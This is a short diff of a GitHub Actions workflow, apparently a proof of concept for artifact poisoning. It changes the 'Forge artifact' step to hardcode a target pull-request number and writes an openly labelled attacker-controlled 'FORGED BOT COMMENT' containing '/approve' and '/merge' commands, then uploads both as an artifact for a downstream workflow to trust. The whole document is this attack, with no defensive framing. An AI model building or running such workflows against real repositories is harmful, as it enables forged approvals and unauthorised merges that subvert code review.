@@ -8,10 +8,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Forge artifact
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
         run: |
-          echo "$PR_NUMBER" > PR_NUMBER
+          echo "2" > PR_NUMBER
           printf '**FORGED BOT COMMENT** - this text is fully attacker controlled.\n\n/approve and comment /merge\n' > COMMENT_BODY.txt
       - uses: actions/upload-artifact@v4
         with:
